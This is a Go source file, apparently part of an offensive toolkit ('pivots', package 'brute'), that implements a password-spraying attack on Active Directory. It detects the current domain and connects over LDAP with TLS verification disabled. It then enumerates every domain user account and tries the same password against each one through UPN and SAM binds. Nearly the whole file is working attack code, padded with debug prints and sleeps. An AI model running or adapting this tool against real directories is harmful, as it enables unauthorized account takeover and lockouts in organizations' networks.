// pivots/ad.go
package brute

import (
	"crypto/tls"
	"fmt"
	"os"
	"strings"
	"time"
	"net"

	"github.com/go-ldap/ldap/v3"
)

const (
	defaultLDAPPort = 636
	timeout         = 15 * time.Second
)

// ADSpray performs password spray against all domain users
func ADSpray(password string, domain ...string) (bool, error) {
	fmt.Println("Starting to spray")
	time.Sleep(5 * time.Second)
	targetDomain := ""
	if len(domain) > 0 {
		targetDomain = domain[0]
	}
	fmt.Printf("[DEBUG] Password: %s  Targetomain : %s\n",password, targetDomain)
	time.Sleep(5 * time.Second)

	if targetDomain == "" {
		fmt.Println("[DEBUG] dumping courrent domain")
		time.Sleep(5 * time.Second)
		currentDomain, err := getCurrentDomain()
		if err != nil {
			time.Sleep(5 * time.Second)
			return false, fmt.Errorf("domain detection failed: %v", err)
		}
		time.Sleep(5 * time.Second)
		targetDomain = currentDomain
	}

	conn, err := createLDAPConn(targetDomain)
	if err != nil {
		return false, fmt.Errorf("LDAP connection failed: %v", err)
	}
	defer conn.Close()

	users, err := enumerateDomainUsers(conn, targetDomain)
	if err != nil {
		return false, fmt.Errorf("user enumeration failed: %v", err)
	}
	
	for _, user := range users {
		fmt.Println("[DEBUG] enumerating domain users")
		time.Sleep(5 * time.Second)
		success, err := attemptAuth(conn, user, password, targetDomain)
		fmt.Printf("trying to connect with %s : %s : %s", user, password, targetDomain)
		time.Sleep(5 * time.Second)
		if err != nil {
			// Re-establish connection if broken
			conn, err = recreateConnection(conn, targetDomain)
			if err != nil {
				return false, err
			}
		}
		if success {
			return true, nil
		}
	}

	return false, nil
}

func recreateConnection(oldConn *ldap.Conn, domain string) (*ldap.Conn, error) {
	oldConn.Close()
	return createLDAPConn(domain)
}

func enumerateDomainUsers(conn *ldap.Conn, domain string) ([]string, error) {
	fmt.Println("[DEBUG] Enumerate domain users")
	time.Sleep(5 * time.Second)
	searchReq := ldap.NewSearchRequest(
		getBaseDN(domain),
		ldap.ScopeWholeSubtree,
		ldap.NeverDerefAliases,
		0,
		int(timeout.Seconds()),
		false,
		"(&(objectClass=user)(!(objectClass=computer)))",
		[]string{"sAMAccountName"},
		nil,
	)
	fmt.Println("[DEBUG] ldapSearshing ")
	time.Sleep(5 * time.Second)

	result, err := conn.Search(searchReq)
	if err != nil {
		return nil, fmt.Errorf("LDAP search failed: %v", err)
	}

	users := make([]string, len(result.Entries))
	for i, entry := range result.Entries {
		users[i] = entry.GetAttributeValue("sAMAccountName")
	}
	fmt.Println("[DEBUG] Enum dom users done!")
	time.Sleep(5 * time.Second)

	return users, nil
}

func attemptAuth(conn *ldap.Conn, user, password, domain string) (bool, error) {
	// Try UPN authentication
	fmt.Println("Attempting to auth")
	time.Sleep(5 * time.Second)
	err := conn.Bind(fmt.Sprintf("%s@%s", user, domain), password)
	if err == nil {
		return true, nil
	}

	// Try SAM authentication
	fmt.Println("SAM Auth")
	time.Sleep(5 * time.Second)
	err = conn.Bind(fmt.Sprintf("%s\\%s", domain, user), password)
	if err == nil {
		return true, nil
	}

	// Check for non-credential errors
	if ldapErr, ok := err.(*ldap.Error); ok {
		if ldapErr.ResultCode == ldap.LDAPResultInvalidCredentials {
			return false, nil // Expected error for wrong credentials
		}
		return false, fmt.Errorf("authentication error: %v", err)
	}

	return false, nil
}

/*
func createLDAPConn(domain string) (*ldap.Conn, error) {
	fmt.Printf("[DEBUG] Attempting connection to %s:%d\n", domain, defaultLDAPPort)
	time.Sleep(10 * time.Second)
	conn, err := ldap.DialTLS("tcp", fmt.Sprintf("%s:%d", domain, defaultLDAPPort), &tls.Config{
		InsecureSkipVerify: true,
		ServerName:         domain,
	})
	if err != nil {
		return nil, fmt.Errorf("connection to %s failed: %v", domain, err)
	}
	conn.SetTimeout(timeout)
	return conn, nil
}
*/
func createLDAPConn(domain string) (*ldap.Conn, error) {
	// Attempt LDAPS first
	conn, err := ldap.DialTLS("tcp", fmt.Sprintf("%s:%d", domain, defaultLDAPPort), &tls.Config{
		InsecureSkipVerify: true,
		ServerName:         domain,
	})
	
	if err == nil {
		return conn, nil
	}

	// Fallback to StartTLS on port 389
	plainConn, dialErr := ldap.Dial("tcp", fmt.Sprintf("%s:389", domain))
	if dialErr != nil {
		return nil, fmt.Errorf("both LDAPS and LDAP failed:\n- LDAPS: %v\n- LDAP: %v", err, dialErr)
	}

	if startTlsErr := plainConn.StartTLS(&tls.Config{
		InsecureSkipVerify: true,
		ServerName:         domain,
	}); startTlsErr != nil {
		plainConn.Close()
		return nil, fmt.Errorf("StartTLS failed: %v", startTlsErr)
	}

	return plainConn, nil
}


func isNetworkError(err error) bool {
	if _, ok := err.(*net.OpError); ok {
		return true
	}
	if strings.Contains(err.Error(), "connection refused") {
		return true
	}
	return false
}



// Get- curent domain
func getCurrentDomain() (string, error) {
	fmt.Println("[DEBUG] Attempting to get current domain")
	time.Sleep(5 * time.Second)
	// Try environment variables first
	if domain := getDomainFromEnv(); domain != "" {
		return domain, nil
	}

	// Fallback to DNS-based detection
	return getDNSDomain(), nil
}

func getBaseDN(domain string) string {
	parts := strings.Split(domain, ".")
	baseDN := ""
	for _, part := range parts {
		if baseDN != "" {
			baseDN += ","
		}
		baseDN += "DC=" + part
	}
	return baseDN
	//time.Sleep(5 *time.Second)
}

func getDomainFromEnv() string {
	// Use os.Getenv instead of undefined getEnv
	if domain := os.Getenv("USERDNSDOMAIN"); domain != "" {
		return strings.ToLower(domain)
	}
	if domain := os.Getenv("LOGONSERVER"); domain != "" {
		return strings.TrimPrefix(domain, "\\\\")
		time.Sleep(5 * time.Second)
	}
	return ""
//	time.Sleep(5 * time.Second)
}


func getDNSDomain() string {
	// Simplified DNS-based domain discovery
	// This would be replaced with actual DNS lookup in production
	return "corp.example.com" // Fallback value
}



